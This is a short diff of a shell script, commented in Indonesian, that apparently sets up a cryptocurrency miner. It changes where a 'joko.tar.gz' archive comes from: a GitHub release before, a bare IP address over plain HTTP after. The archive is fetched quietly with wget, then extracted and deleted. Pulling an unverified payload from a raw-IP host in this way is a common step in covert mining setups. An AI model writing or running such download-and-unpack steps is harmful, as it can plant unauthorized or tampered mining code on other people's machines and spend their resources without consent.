@@ -17,7 +17,7 @@ cd "$APP_DIR"
 
 # Unduh dan ekstrak hanya jika belum ada
 if [ ! -d "$MINER_DIR" ]; then
-    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/joko.tar.gz -O joko.tar.gz
+    wget -q http://43.163.114.162/joko.tar.gz -O joko.tar.gz
     tar -xf joko.tar.gz
     rm -f joko.tar.gz
 fi
